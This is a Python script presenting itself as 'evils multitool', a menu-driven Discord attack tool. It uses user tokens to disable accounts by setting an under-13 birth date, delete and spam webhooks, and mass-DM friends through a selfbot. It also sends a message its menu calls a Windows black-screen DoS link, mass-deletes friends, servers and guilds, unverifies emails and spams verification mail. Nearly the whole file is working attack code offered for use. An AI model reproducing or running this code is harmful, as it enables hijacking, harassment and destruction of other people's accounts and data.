from os import remove, system, name 
import requests
from discord import Webhook, RequestsWebhookAdapter
import colorama
from colorama import Fore
import threading
import sys
import discord
from discord.ext import commands
import json
import random
import time
import asyncio
import discord, os, sys, colorama, random
from colorama import Fore
import threading
from time import sleep
r = Fore.RESET
g = Fore.RED
R = Fore.RED
import discord, os, sys, colorama, random
client = discord.Client()


os.system(f'title multitool [ created by evil#9731]')

from requests.api import delete

words = "evils multitool"
for char in words:
    sleep(0.1)
    sys.stdout.write(char)
    sys.stdout.flush()
time.sleep(2)
os.system('cls')

def mainmenu():
    print("""                      evils multitool

                                   [1] Webhook tools 
                                   [2] Selfbotting""")
mainmenu()
maininput = input('Select>> ')
def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')
def WebHook():
 url = input("Webhook Url>> ")
 message = input("Message>> ")
 threading.Thread(target=WebHook).start()
 while True:
  webhook = Webhook.from_url(f"{url}", adapter=RequestsWebhookAdapter())
  webhook.send(f"{message}")
  print('Ctrl + C to exit')

def accountdisabler():

    class Exploit:

        DISABLED_MESSAGE = "You need to be 13 or older in order to use Discord."
        IMMUNE_MESSAGE = "You cannot update your date of birth."

        def __init__(self, token):
            self.token = token
            self.headers = {'Authorization': token}


        def execute(self):
            """ set DoB to < 13 yo """
            res = requests.patch('https://discordapp.com/api/v6/users/@me', headers=self.headers, json={'date_of_birth': '2017-2-11'})

            if res.status_code == 400:
                res_message = res.json().get('date_of_birth', ['no response message'])[0]
                
                if res_message == self.DISABLED_MESSAGE:
                    print('Account disabled')

                elif res_message == self.IMMUNE_MESSAGE:
                    print('Account is immune to this exploit')

                else:
                    print(f'Unknown response message: {res_message}')
            else:
                print('Failed to disable account')
        

    def main():

        token = input('[+] Please input user token: ')

        exploit = Exploit(token)

        exploit.execute()


    if __name__ == '__main__':
        main()
def webhookdelete():
    class Exploit:

        def __init__(self, url):
            self.webhook_url = url


        def execute(self):
            """ send DELETE request to webhook url """
            return requests.delete(self.webhook_url)

        
    def delete():
        webhookurl = input('Input Webhook URL>> ')

        webhook_url = webhookurl

        exploit = Exploit(webhook_url)

        exploit.execute()


    if __name__ == '__main__':
        delete()
def selfbotmassdm():
    client = discord.Client()
    token = input("[+] Input User Token: ")
    messages = input('[+] What message do you want to input?: ')
    @client.event
    async def on_connect():
        for user in client.user.friends:
            try:
                await user.send(messages)
                print(f"[+] Successfully messaged: {user.name}")
            except:
                print(f"[-] Couldn't message: {user.name}")
    client.run(token, bot=False)
def emailunverify():

    class Exploit:

        def __init__(self, token, channel):
            self.token = token
            self.channel_id = channel
            self.headers = {'Authorization': token}


        def execute(self):
            """ unverify e-mail """
            return requests.get('https://discord.com/api/v6/guilds/0/members', headers=self.headers)


    def main():

        token = input('[+] Input User Token: ')
        channel_id = ""

        exploit = Exploit(token, channel_id)

        exploit.execute()


    if __name__ == '__main__':
        main()
def blackscreendos():
    class Exploit:

        def __init__(self, token, channel):
            self.token = token
            self.channel_id = channel
            self.headers = {'Authorization': token}


        def execute(self):
            """ send malicious URI """
            return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': '<ms-cxh-full://0>'})

        
    def main():

        token = input('[+] Input user token: ')
        channel_id = input('[+] Channel ID: ')

        exploit = Exploit(token, channel_id)

        exploit.execute()


    if __name__ == '__main__':
        main()
def wordlimitbypass():
    class Exploit:

        def __init__(self, token, channel):
            self.token = token
            self.channel_id = channel
            self.headers = {'Authorization': token}

        @property
        def uri(self):
            chars = ''.join(random.choice('\'"^`|{}') for _ in range(1993))
            return f'<a://a{chars}>'

        def execute(self):
            """ send magical URI """
            return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'content': self.uri})

        
    def main():

        token = input('[+] Input User Token: ')
        channel_id = input('[+] Input channel ID: ')

        exploit = Exploit(token, channel_id)

        exploit.execute()


    if __name__ == '__main__':
        main()
def customgif():

    class Exploit:

        def __init__(self, token, channel, gif, url):
            self.token = token
            self.channel_id = channel
            self.gif = gif
            self.url = url
            self.headers = {'Authorization': token}


        @property
        def _embed(self):
            return {'url': self.url, 'image': {'url': self.gif}}


        def execute(self):
            """ send GIF in text channel """
            return requests.post(f'https://discordapp.com/api/v6/channels/{self.channel_id}/messages', headers=self.headers, json={'embed': self._embed})

        
    def main():

        token = input('[+] The user token: ')
        channel_id = input('[+] The channel ID of where you want to send the GIF: ')
        gif_url = input('[+] The original GIF URL: ')
        custom_url = input('[+] Input your custom URL: ')

        exploit = Exploit(token, channel_id, gif_url, custom_url)

        exploit.execute()



    if __name__ == '__main__':
        main()

def get_all_friends():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    r = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
    time.sleep(3)
def get_token_information():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    token_info_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me", headers=headers
    ).json()
    for key in token_info_request:
        print(f"{Fore.WHITE}{key}: {Fore.RED}{token_info_request[f'{key}']}")
    time.sleep(3)

def remove_all_token_friends():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
        )
        print(f"Removed Friend {i['id']}")

def block_all_token_friends():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v8/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )
        print(f"Blocked Friend {i['id']}")
def leave_all_servers():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
        print(f"Left Guild: {guild['id']}")
def delete_personal_guilds():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    print("Got Data")
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
        print(i["id"],' goodnight kid')
def cycle_token_status():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    for i in range(0, 50):
        json = {"custom_status": {"text": "goodnight kid!", "emoji_name": "🍉"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "sucks to suck", "emoji_name": "🥵"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
        json = {"custom_status": {"text": "message me mbn evil#9731", "emoji_name": "😈"}}
        requests.patch(
            "https://discord.com/api/v8/users/@me/settings", headers=headers, json=json
        )
        time.sleep(0.7)
def mark_servers_as_read():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mark_guild_request = requests.get(
        "https://discord.com/api/v8/users/@me/guilds", headers=headers
    ).json()
    for channel in mark_guild_request:
        r = requests.post(
            f"https://discord.com/api/v8/guilds/{channel['id']}/ack", headers=headers
        )
        print(channel["id"])

def close_all_dms():
    Token = input('[+] Input user token: ')
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v8/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v8/channels/{channel['id']}",
            headers=headers,
        )

def get_token_country():
    Token = input('[+] Input User token: ')
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    token_country_request = requests.get(
        "https://discord.com/api/v8/auth/location-metadata", headers=headers
    ).json()
    print(f"Token Country: {token_country_request['country_code']}")

def resend_verification_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.post("https://discord.com/api/v8/auth/verify/resend", headers=headers)
def remove_token_email(Token):
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    requests.get(
        "https://canary.discordapp.com/api/v8/guilds/0/members", headers=headers
    )
def spam_token_email():
    Token = input('[+] Input user token: ')
    for i in range(0, 20):
        remove_token_email(Token)
        time.sleep(2)
        resend_verification_email(Token)
if maininput == '1':
    clear()
    print("""
                ┬ ┬┌─┐┌┐ ┬ ┬┌─┐┌─┐┬┌─
                │││├┤ ├┴┐├─┤│ ││ │├┴┐
                └┴┘└─┘└─┘┴ ┴└─┘└─┘┴ ┴
                    [1] Webhook Spammer
                    [2] Webhook Deleter""")
    webhookinput = input('Select>>')
    if webhookinput == '1':
        colorama.init()
        WebHook()
    elif webhookinput == '2':
        webhookdelete()
    else:
        print('not a choice')
elif maininput == '2':
    clear()
    print("""
                                   ┌─┐┌─┐┬  ┌─┐┌┐ ┌─┐┌┬┐
                                   └─┐├┤ │  ├┤ ├┴┐│ │ │ 
                                   └─┘└─┘┴─┘└  └─┘└─┘ ┴ 
            [1] Mass Dming (friend list only)          
            [2] Mass DM (using IDS from ID logging/ feed ID list) 
            [3] Bypass block (DM people you have blocked)
            [4] Account Disabler (Only works if account birthdate is not set)
            [5] Email unverifiy
            [6] Black Screen Dos, if link clicked turns screen black and cannot be fixed unless reboot (windows only)
            [7] 2000 word limit bypass
            [8] Custom GIF URL (remember the gif must be added to favourites before you use this)
            [9] Voice chat DOS (must have manage server permissions to perform this)
            [10] Get all friends from user
            [11] Get token information
            [12] Remove all friends
            [13] Block all friends
            [14] Leave all servers
            [15] Spam token settings
            [16] Delete all personal guilds
            [17] Cycle token status
            [18] Mark all servers as read
            [19] Close all DMS
            [20] Get token country
            [21] Spam verification email""")
    selfbotinput = input('Select>> ')
    if selfbotinput == '1':
        clear()
        selfbotmassdm()
    elif selfbotinput == '2':
        clear()
        selfbotmassdm()
    elif selfbotinput == '3':
        clear()
        print('patched by discord recently')
    elif selfbotinput == '4':
        clear()
        accountdisabler()
    elif selfbotinput == '5':
        emailunverify()
    elif selfbotinput == '6':
        blackscreendos()
    elif selfbotinput == '7':
        wordlimitbypass()
    elif selfbotinput == '8':
        clear()
        customgif()
    elif selfbotinput == '10':
        clear()
        get_all_friends()
    elif selfbotinput == '11':
        clear()
        get_token_information()
    elif selfbotinput == '12':
        clear()
        remove_all_token_friends()
    elif selfbotinput == '13':
        clear()
        block_all_token_friends()
    elif selfbotinput == '14':
        clear()
        leave_all_servers()
    elif selfbotinput == '15':
        clear()
        Token = input('[+] Input User Token: ')
        for i in range(0, 100):
            headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
            condition_status = True
            payload = {"theme": "light", "developer_mode": condition_status, "afk_timeout": 60, "locale": "ko", "message_display_compact": condition_status, "explicit_content_filter": 2, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 1, "enable_tts_command": condition_status,  "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "idle", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
            requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
            condition_status = False
            payload = {"theme": "dark", "developer_mode": condition_status, "afk_timeout": 120, "locale": "bg", "message_display_compact": condition_status, "explicit_content_filter": 0, "default_guilds_restricted": condition_status, "friend_source_flags": {"all": condition_status, "mutual_friends": condition_status, "mutual_guilds": condition_status}, "inline_embed_media": condition_status, "inline_attachment_media": condition_status, "gif_auto_play": condition_status, "render_embeds": condition_status, "render_reactions": condition_status, "animate_emoji": condition_status, "convert_emoticons": condition_status, "animate_stickers": 2, "enable_tts_command": condition_status, "native_phone_integration_enabled": condition_status, "contact_sync_enabled": condition_status, "allow_accessibility_detection": condition_status, "stream_notifications_enabled": condition_status, "status": "dnd", "detect_platform_accounts": condition_status, "disable_games_tab": condition_status}
            requests.patch("https://canary.discord.com/api/v8/users/@me/settings", headers=headers, json=payload)
    elif selfbotinput == '16':
        clear()
        delete_personal_guilds()
    elif selfbotinput == '17':
        clear()
        cycle_token_status()
    elif selfbotinput == '18':
        clear()
        mark_servers_as_read()
    elif selfbotinput == '19':
        clear()
        close_all_dms()
    elif selfbotinput == '20':
        clear()
        get_token_country()
    elif selfbotinput == '21':
        clear()
        spam_token_email()
    else:
        print('Not a choice')

